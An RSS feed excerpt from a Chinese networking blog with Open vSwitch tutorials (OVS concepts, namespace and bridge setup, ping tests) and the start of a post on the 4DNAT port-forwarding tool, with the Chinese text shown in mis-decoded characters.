&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set vnet1 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip addr add 10.0.0.4/24 dev vnet1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;æµ‹è¯•&#34;&gt;æµ‹è¯•&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æµ‹è¯• &lt;code&gt;ä¸»æœºA&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ping 10.0.0.3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ping 10.0.0.4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ping 10.0.0.3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ping 10.0.0.4
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;æµ‹è¯• &lt;code&gt;ä¸»æœºB&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ping 10.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ping 10.0.0.2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ping 10.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ping 10.0.0.2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;æµ‹è¯•ç»“æœ&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;ä¸»æœºA&lt;/th&gt;
          &lt;th&gt;ä¸»æœºB&lt;/th&gt;
          &lt;th&gt;ping ç»“æœ&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;ns0&lt;/td&gt;
          &lt;td&gt;ns0&lt;/td&gt;
          &lt;td&gt;å¯é€šä¿¡ âœ…&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ns0&lt;/td&gt;
          &lt;td&gt;ns1&lt;/td&gt;
          &lt;td&gt;å¯é€šä¿¡ âœ…&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ns1&lt;/td&gt;
          &lt;td&gt;ns0&lt;/td&gt;
          &lt;td&gt;å¯é€šä¿¡ âœ…&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ns1&lt;/td&gt;
          &lt;td&gt;ns1&lt;/td&gt;
          &lt;td&gt;å¯é€šä¿¡ âœ…&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;æ ¹æ®æµ‹è¯•ç»“æœå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä½¿ç”¨OVSæˆåŠŸçš„è”é€šäº†åˆ†å¸ƒåœ¨ä¸åŒä¸»æœºä¸Šçš„è™šæ‹Ÿç½‘ç»œè®¾å¤‡ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Open vSwitch å…¥é—¨å®è·µï¼ˆ2ï¼‰ä½¿ç”¨OVSæ„å»ºéš”ç¦»ç½‘ç»œ</title>
      <link>https://www.typesafe.cn/posts/ovs-learn-2/</link>
      <pubDate>Thu, 26 Nov 2020 22:55:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/ovs-learn-2/</guid>
      <description>&lt;h1 id=&#34;å‰è¨€&#34;&gt;å‰è¨€&lt;/h1&gt;
&lt;p&gt;åœ¨å‰é¢æˆ‘ä»¬å·²ç»ä½¿ç”¨Linux Bridgeå®Œæˆäº†å¤šå°ç½‘ç»œè®¾å¤‡çš„é€šä¿¡ï¼Œä½†æ˜¯å®ƒå¯¹äºç½‘ç»œéš”ç¦»çš„æ”¯æŒä¸æ˜¯å¾ˆå¥½ï¼Œé•¿æœŸä»¥æ¥ï¼Œåœ¨Linuxå¹³å°ä¸Šç¼ºå°‘ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„è™šæ‹Ÿäº¤æ¢æœºï¼Œç›´åˆ°OVSçš„å‡ºç°ã€‚&lt;/p&gt;
&lt;h1 id=&#34;å®éªŒ&#34;&gt;å®éªŒ&lt;/h1&gt;
&lt;p&gt;æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å°è¯•å®Œæˆä¸¤ä¸ªå®éªŒï¼Œå•æœºæ— éš”ç¦»ç½‘ç»œã€å•æœºéš”ç¦»ç½‘ç»œã€‚&lt;/p&gt;
&lt;h2 id=&#34;å®éªŒä¸€å•æœºæ— éš”ç¦»ç½‘ç»œ&#34;&gt;å®éªŒä¸€ï¼šå•æœºæ— éš”ç¦»ç½‘ç»œ&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨ovsæ„å»ºæ— éš”ç¦»ç½‘ç»œéå¸¸ç®€å•ï¼Œåªéœ€è¦æ·»åŠ ä¸€ä¸ªç½‘æ¡¥ï¼Œç„¶ååœ¨è¿™ä¸ªç½‘æ¡¥ä¸Šå†å¢åŠ å‡ ä¸ªå†…éƒ¨ç«¯å£ï¼Œæœ€åæŠŠç«¯å£ç§»åŠ¨åˆ°netnsä¸­å³å¯ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ç½‘æ¡¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-br br-int
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ä¸‰ä¸ªå†…éƒ¨ç«¯å£&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet0 -- set Interface vnet0 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet1 -- set Interface vnet1 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-port br-int vnet2 -- set Interface vnet2 type&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;internal
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# æ·»åŠ ä¸‰ä¸ªnetns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns add ns2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å°†å†…éƒ¨ç«¯å£åˆ†åˆ«ç§»åŠ¨åˆ°netnsä¸­&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet0 netns ns0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet1 netns ns1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip link set vnet2 netns ns2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# å¯åŠ¨ç«¯å£å¹¶é…ç½®IP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip link set vnet0 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns0 ip addr add 10.0.0.1/24 dev vnet0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip link set vnet1 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns1 ip addr add 10.0.0.2/24 dev vnet1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns2 ip link set lo up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns2 ip link set vnet2 up
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip netns exec ns2 ip addr add 10.0.0.3/24 dev vnet2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æµ‹è¯•&lt;/p&gt;</description>
    </item>
    <item>
      <title>Open vSwitch å…¥é—¨å®è·µï¼ˆ1ï¼‰Open vSwitch æ˜¯ä»€ä¹ˆ</title>
      <link>https://www.typesafe.cn/posts/ovs-learn-1/</link>
      <pubDate>Wed, 25 Nov 2020 17:49:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/ovs-learn-1/</guid>
      <description>&lt;h1 id=&#34;ovsç®€ä»‹&#34;&gt;OVSç®€ä»‹&lt;/h1&gt;
&lt;h3 id=&#34;open-vswitch-æ˜¯ä»€ä¹ˆ&#34;&gt;Open vSwitch æ˜¯ä»€ä¹ˆï¼Ÿ&lt;/h3&gt;
&lt;p&gt;Open vSwitch(ä»¥ä¸‹ç®€ç§°OVS)æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€å¼€å‘çš„å¤šå±‚è™šæ‹Ÿäº¤æ¢æœºï¼Œä½¿ç”¨Apcahe 2å¼€æºè®¸å¯è¯ï¼Œç°å¦‚ä»ŠåŸºæœ¬ä¸Šå·²ç»æˆä¸ºäº†å¼€æºSDNï¼ˆè½¯ä»¶å®šä¹‰ç½‘ç»œï¼‰åŸºç¡€è®¾æ–½å±‚çš„äº‹å®æ ‡å‡†ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ovsæ”¯æŒå“ªäº›åŠŸèƒ½&#34;&gt;OVSæ”¯æŒå“ªäº›&lt;a href=&#34;http://www.openvswitch.org//features/&#34;&gt;åŠŸèƒ½&lt;/a&gt;ï¼Ÿ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æ”¯æŒNetFlowã€sFlow(R)ã€IPFIXã€SPANã€RSPANå’ŒGREéš§é“é•œåƒç­‰å¤šç§æµé‡ç›‘æ§åè®®&lt;/li&gt;
&lt;li&gt;æ”¯æŒLACP (IEEE 802.1AX-2008)&lt;/li&gt;
&lt;li&gt;æ”¯æŒæ ‡å‡†802.1Q VLANåè®®ï¼Œå…è®¸ç«¯å£é…ç½®trunkæ¨¡å¼&lt;/li&gt;
&lt;li&gt;æ”¯æŒç»„æ’­&lt;/li&gt;
&lt;li&gt;æ”¯æŒBFDå’Œ802.1agé“¾è·¯ç›‘æ§&lt;/li&gt;
&lt;li&gt;æ”¯æŒSTPï¼ˆIEEE 802.1D-1998ï¼‰å’ŒRSTPï¼ˆIEEE 802.1D-2004ï¼‰&lt;/li&gt;
&lt;li&gt;æ”¯æŒç»†ç²’åº¦çš„QoSï¼ˆæœåŠ¡è´¨é‡ï¼‰é…ç½®&lt;/li&gt;
&lt;li&gt;æ”¯æŒHFSC qdisc&lt;/li&gt;
&lt;li&gt;æ”¯æŒæ¥ç®¡æ¯ä¸€ä¸ªè™šæ‹Ÿæœºçš„æµé‡&lt;/li&gt;
&lt;li&gt;æ”¯æŒåŸºäºæºMACçš„è´Ÿè½½å‡è¡¡ã€ä¸»å¤‡æ¨¡å¼å’ŒL4å“ˆå¸Œçš„ç«¯å£ç»‘å¸¦&lt;/li&gt;
&lt;li&gt;æ”¯æŒOpenFlowåè®®ï¼ˆåŒ…å«äº†å¾ˆå¤šå¯¹è™šæ‹ŸåŒ–çš„æ‰©å±•ï¼‰&lt;/li&gt;
&lt;li&gt;æ”¯æŒIPv6&lt;/li&gt;
&lt;li&gt;æ”¯æŒå¤šç§éš§é“åè®®ï¼ˆGREã€VXLANã€STTã€Geneveå’ŒIPsecï¼‰&lt;/li&gt;
&lt;li&gt;æ”¯æŒCå’ŒPythonçš„è¿œç¨‹é…ç½®åè®®&lt;/li&gt;
&lt;li&gt;æ”¯æŒå†…æ ¸å’Œç”¨æˆ·ç©ºé—´çš„è½¬å‘å¼•æ“é€‰é¡¹&lt;/li&gt;
&lt;li&gt;å…·æœ‰æµç¼“å­˜å¼•æ“çš„å¤šè¡¨è½¬å‘ç®¡é“&lt;/li&gt;
&lt;li&gt;è½¬å‘å±‚æŠ½è±¡ä»¥ç®€åŒ–å‘æ–°è½¯ä»¶å’Œç¡¬ä»¶å¹³å°çš„ç§»æ¤&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;ovsçš„æœ¯è¯­è§£é‡Š&#34;&gt;OVSçš„æœ¯è¯­è§£é‡Š&lt;/h1&gt;
&lt;h3 id=&#34;bridge&#34;&gt;Bridge&lt;/h3&gt;
&lt;p&gt;ä¸­æ–‡åç§°&lt;strong&gt;ç½‘æ¡¥&lt;/strong&gt;ï¼Œä¸€ä¸ªBridgeä»£è¡¨ä¸€ä¸ªä»¥å¤ªç½‘äº¤æ¢æœºï¼ˆSwitchï¼‰ï¼Œä¸€å°ä¸»æœºä¸­å¯ä»¥åˆ›å»ºä¸€ä¸ªæˆ–å¤šä¸ªBridgeï¼ŒBridgeå¯ä»¥æ ¹æ®ä¸€å®šçš„è§„åˆ™ï¼ŒæŠŠæŸä¸€ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡è½¬å‘åˆ°å¦ä¸€ä¸ªæˆ–å¤šä¸ªç«¯å£ä¸Šï¼Œä¹Ÿå¯ä»¥ä¿®æ”¹æˆ–è€…ä¸¢å¼ƒæ•°æ®æŠ¥æ–‡ã€‚&lt;/p&gt;
&lt;h3 id=&#34;port&#34;&gt;Port&lt;/h3&gt;
&lt;p&gt;ä¸­æ–‡åç§°&lt;strong&gt;ç«¯å£&lt;/strong&gt;ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å®ƒå’ŒTCPé‡Œé¢çš„ç«¯å£ä¸æ˜¯åŒæ ·çš„æ¦‚å¿µï¼Œå®ƒæ›´åƒæ˜¯ç‰©ç†äº¤æ¢æœºä¸Šé¢çš„æ’å£ï¼Œå¯ä»¥æ¥æ°´æ™¶å¤´çš„é‚£ç§ã€‚Portéš¶å±äºBridgeï¼Œå¿…é¡»å…ˆæ·»åŠ äº†Bridgeæ‰èƒ½åœ¨Bridgeä¸Šæ·»åŠ Portã€‚Portæœ‰ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Normal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·å¯ä»¥æŠŠæ“ä½œç³»ç»Ÿä¸­å·²æœ‰çš„ç½‘å¡æ·»åŠ åˆ°Open vSwicthä¸Šï¼ŒOpen vSwitctä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåçš„Portå¼€å¤„ç†è¿™å¼ ç½‘å¡è¿›å’Œå‡ºçš„æ•°æ®æŠ¥æ–‡ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼æ·»åŠ çš„Portä¸æ”¯æŒåˆ†é…IPåœ°å€ï¼Œå¦‚æœä¹‹å‰ç½‘å¡ä¸Šé…ç½®çš„æœ‰IPï¼ŒæŒ‚è½½åˆ°OVSä¸Šé¢ä¹‹åå°†ä¸å¯è®¿é—®ã€‚æ­¤ç±»å‹çš„Portå¸¸ç”¨äºVLANæ¨¡å¼çš„å¤šå°ç‰©ç†ä¸»æœºç›¸è¿çš„é‚£ä¸ªå£ï¼Œäº¤æ¢æœºä¸€ç«¯å±äºTrunkæ¨¡å¼ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Internal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å½“Portçš„ç±»å‹æ˜¯Internalæ—¶ï¼ŒOVSä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘å¡ï¼ˆInterfaceï¼‰ï¼Œæ­¤ç«¯å£æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡éƒ½ä¼šè½¬å‘ç»™è¿™å—ç½‘å¡ï¼Œä»è¿™å—ç½‘å¡å‘å‡ºçš„æ•°æ®æŠ¥æ–‡ä¹Ÿä¼šé€šè¿‡Portäº¤ç»™OVSå¤„ç†ã€‚å½“OVSåˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘æ¡¥æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Internal Portï¼ŒåŒæ—¶ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªä¸ç½‘æ¡¥åŒåçš„Interfaceï¼Œå› æ­¤å¯ä»¥é€šè¿‡ipå‘½ä»¤åœ¨æ“ä½œç³»ç»Ÿä¸­æŸ¥çœ‹åˆ°è¿™å¼ è™šæ‹Ÿç½‘å¡ï¼Œä½†æ˜¯çŠ¶æ€æ˜¯downçš„ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Patch&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Patch Portå’Œveth pairåŠŸèƒ½ç›¸åŒï¼Œæ€»æ˜¯æˆåŒæˆå¯¹çš„å‡ºç°ï¼Œåœ¨å…¶ä¸­ä¸€ç«¯æ”¶åˆ°çš„æ•°æ®æŠ¥æ–‡ä¼šè¢«è½¬å‘åˆ°å¦ä¸€ä¸ªPatch Portä¸Šï¼Œå°±åƒæ˜¯ä¸€æ ¹ç½‘çº¿ä¸€æ ·ã€‚Patch Portå¸¸ç”¨äºè¿æ¥ä¸¤ä¸ªBridgeï¼Œè¿™æ ·ä¸¤ä¸ªç½‘æ¡¥å°±å’Œä¸€ä¸ªç½‘æ¡¥ä¸€æ ·äº†ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Tunnel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OVS æ”¯æŒ GREã€VXLANã€STTã€Geneveå’ŒIPsecéš§é“åè®®ï¼Œè¿™äº›éš§é“åè®®å°±æ˜¯overlayç½‘ç»œçš„åŸºç¡€åè®®ï¼Œé€šè¿‡å¯¹ç‰©ç†ç½‘ç»œåšçš„ä¸€å±‚å°è£…å’Œæ‰©å±•ï¼Œè§£å†³äº†äºŒå±‚ç½‘ç»œæ•°é‡ä¸è¶³çš„é—®é¢˜ï¼Œæœ€å¤§é™åº¦çš„å‡å°‘å¯¹åº•å±‚ç‰©ç†ç½‘ç»œæ‹“æ‰‘çš„ä¾èµ–æ€§ï¼ŒåŒæ—¶ä¹Ÿæœ€å¤§é™åº¦çš„å¢åŠ äº†å¯¹ç½‘ç»œçš„æ§åˆ¶ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;interface&#34;&gt;Interface&lt;/h3&gt;
&lt;p&gt;ï¼ˆiface/æ¥å£ï¼‰æ¥å£æ˜¯OVSä¸æ“ä½œç³»ç»Ÿäº¤æ¢æ•°æ®æŠ¥æ–‡çš„ç»„ä»¶ï¼Œä¸€ä¸ªæ¥å£å³æ˜¯æ“ä½œç³»ç»Ÿä¸Šçš„ä¸€å—ç½‘å¡ï¼Œè¿™ä¸ªç½‘å¡å¯èƒ½æ˜¯OVSç”Ÿæˆçš„è™šæ‹Ÿç½‘å¡ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æŒ‚è½½åœ¨OVSä¸Šçš„ç‰©ç†ç½‘å¡ï¼Œæ“ä½œç³»ç»Ÿä¸Šçš„è™šæ‹Ÿç½‘å¡ï¼ˆTUN/TAPï¼‰ä¹Ÿå¯ä»¥è¢«æŒ‚è½½åœ¨OVSä¸Šã€‚&lt;/p&gt;
&lt;h3 id=&#34;controller&#34;&gt;Controller&lt;/h3&gt;
&lt;p&gt;OpenFlowæ§åˆ¶å™¨ï¼ŒOVSå¯ä»¥æ¥æ”¶ä¸€ä¸ªæˆ–è€…å¤šä¸ªOpenFlowæ§åˆ¶å™¨çš„ç®¡ç†ï¼ŒåŠŸèƒ½ä¸»è¦æ˜¯ä¸‹å‘æµè¡¨ï¼Œæ§åˆ¶è½¬å‘è§„åˆ™ã€‚&lt;/p&gt;
&lt;h3 id=&#34;flow&#34;&gt;Flow&lt;/h3&gt;
&lt;p&gt;æµè¡¨æ˜¯OVSè¿›è¡Œæ•°æ®è½¬å‘çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå®šä¹‰äº†ç«¯å£ä¹‹é—´è½¬å‘æ•°æ®æŠ¥æ–‡çš„è§„åˆ™ï¼Œä¸€æ¡æµè¡¨è§„åˆ™ä¸»è¦åˆ†ä¸ºåŒ¹é…å’ŒåŠ¨ä½œä¸¤éƒ¨åˆ†ï¼ŒåŒ¹é…éƒ¨åˆ†å†³å®šå“ªäº›æ•°æ®æŠ¥æ–‡éœ€è¦è¢«å¤„ç†ï¼ŒåŠ¨ä½œå†³å®šäº†åŒ¹é…åˆ°çš„æ•°æ®æŠ¥æ–‡è¯¥å¦‚ä½•å¤„ç†ã€‚&lt;/p&gt;
&lt;h1 id=&#34;ovså¸¸ç”¨æ“ä½œ&#34;&gt;OVSå¸¸ç”¨æ“ä½œ&lt;/h1&gt;
&lt;h3 id=&#34;å®‰è£…&#34;&gt;å®‰è£…&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install openvswitch
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl enable openvswitch
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl start openvswitch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;å¦‚æœå½“å‰è½¯ä»¶æºä¸­æ²¡æœ‰openvswitchï¼Œå¯ä»¥é€šè¿‡&lt;a href=&#34;https://developer.aliyun.com/packageSearch?word=openvswitch&#34;&gt;é˜¿é‡Œäº‘å®˜æ–¹é•œåƒç«™&lt;/a&gt;ä¸‹è½½å’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬å¯¹åº”çš„rpmåŒ…åˆ°æœ¬åœ°å†å®‰è£…ã€‚ ç¤ºä¾‹å‘½ä»¤ï¼š &lt;code&gt;yum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>æœåŠ¡å™¨ä¸å…è®¸ä¸Šç½‘å¹¶ä¸”éœ€è¦è·³æ¿æœºæ‰èƒ½è®¿é—®ï¼Ÿå­¦ä¼šä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼Œè½»æ¾è®©æœåŠ¡å™¨ä½¿ç”¨yumã€‚</title>
      <link>https://www.typesafe.cn/posts/4dnat/</link>
      <pubDate>Thu, 19 Nov 2020 22:33:00 +0000</pubDate>
      <guid>https://www.typesafe.cn/posts/4dnat/</guid>
      <description>&lt;h1 id=&#34;å‰è¨€&#34;&gt;å‰è¨€&lt;/h1&gt;
&lt;p&gt;ä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ï¼ŒæœåŠ¡å™¨ä¸èƒ½ä¸Šç½‘ï¼Œä½†æ˜¯åˆéœ€è¦å®‰è£…æŸä¸ªè½¯ä»¶ï¼Œé¢å¯¹å¦‚è››ç½‘èˆ¬æ‚ä¹±çš„rpmåŒ…ä¾èµ–å…³ç³»ï¼Œæ”¾å¼ƒæˆ–è®¸æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œè¿™æ ·ä½ å°±ä¸å¿…å†ä¸ºæ— æ³•å®Œæˆå·¥ä½œè€Œç—›è‹¦åˆæ‡Šæ¼ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ä»Šå¤©ï¼Œä½ æœ‰äº†ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚&lt;/p&gt;
&lt;h1 id=&#34;4dnat&#34;&gt;&lt;a href=&#34;https://github.com/dushixiang/4dnat&#34;&gt;4DNAT&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;4DNATå–åæºè‡ª4å’ŒDNATã€‚è¿™ä¸ªå·¥å…·å·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬å››å±‚ä¼ è¾“å±‚ï¼ŒåŒæ—¶4å’Œforè°éŸ³ï¼Œæ„ä¸ºä¸“é—¨ä¸ºç›®æ ‡åœ°å€è½¬æ¢è€ŒæœåŠ¡çš„å·¥å…·ã€‚4DNATä½¿ç”¨goè¯­è¨€å¼€å‘ï¼Œå…·æœ‰å¤©ç„¶çš„è·¨å¹³å°æ€§ï¼Œå¹¶ä¸”å®Œå…¨ä½¿ç”¨goæ ‡å‡†åº“å¼€å‘ï¼Œæ²¡æœ‰ä»»ä½•çš„ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œç¼–è¯‘ä¹‹ååªæœ‰ä¸€ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚å®ƒæœ‰4ç§å·¥ä½œæ¨¡å¼ï¼š&lt;/p&gt;
&lt;h3 id=&#34;è½¬å‘æ¨¡å¼&#34;&gt;è½¬å‘æ¨¡å¼&lt;/h3&gt;
&lt;p&gt;æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›‘å¬ç«¯å£å’Œç›®æ ‡åœ°å€ï¼Œåœ¨ç›‘å¬ç«¯å£æ¥æ”¶åˆ°è¯·æ±‚åä¼šä¸»åŠ¨è¿æ¥ç›®æ ‡åœ°å€ï¼Œç¤ºä¾‹ï¼š&lt;/p&gt;
